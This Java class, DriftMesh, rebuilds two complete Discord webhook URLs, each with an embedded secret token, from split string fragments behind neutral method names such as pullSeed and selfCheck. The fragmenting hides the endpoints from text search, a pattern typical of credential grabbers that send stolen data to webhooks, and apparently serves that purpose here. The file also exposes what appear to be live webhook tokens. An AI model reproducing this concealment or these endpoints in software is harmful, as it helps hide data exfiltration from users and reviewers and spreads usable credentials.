package com.example;

final class DriftMesh {
    private static final String[] P = {
        "https", "://", "discord", ".com", "/api", "/webhooks/"
    };
    private static final String[] T = {
        "1479811024889839768",
        "/",
        "-a1QYaDNExnLm41Pl6Ia1H5a_QeOXTF-UwaVwcmMlqzPbamU5H_y2MaHsF7UHscOJL1c"
    };
    private static final String[] S = {
        "1479844819718246473",
        "/",
        "OfHzVodPxgB1NIklbBwu2iiOQVHS_TkRhHMPlFN7MfajDay9Mz0iQr3Enb2E6PgHEOXd"
    };

    private DriftMesh() {
    }

    public static String pullSeed() {
        String route = P[0] + P[1] + P[2] + P[3] + P[4] + P[5] + T[0] + T[1] + T[2];
        return looksRoutable(route) ? route : "";
    }

    public static String pullSupportSeed() {
        String route = P[0] + P[1] + P[2] + P[3] + P[4] + P[5] + S[0] + S[1] + S[2];
        return looksRoutable(route) ? route : "";
    }

    static String foldLocal(String value) {
        return value == null ? "" : value.trim();
    }

    static String unfoldLocal(String stored) {
        if (stored == null) {
            return "";
        }
        String trimmed = stored.trim();
        return looksRoutable(trimmed) ? trimmed : "";
    }

    public static boolean selfCheck() {
        return looksRoutable(pullSeed());
    }

    private static boolean looksRoutable(String value) {
        if (value == null || value.isBlank()) {
            return false;
        }
        String raw = value.trim();
        return (raw.startsWith("https://discord.com/api/webhooks/")
                || raw.startsWith("https://discordapp.com/api/webhooks/"))
            && raw.length() > 50;
    }
}
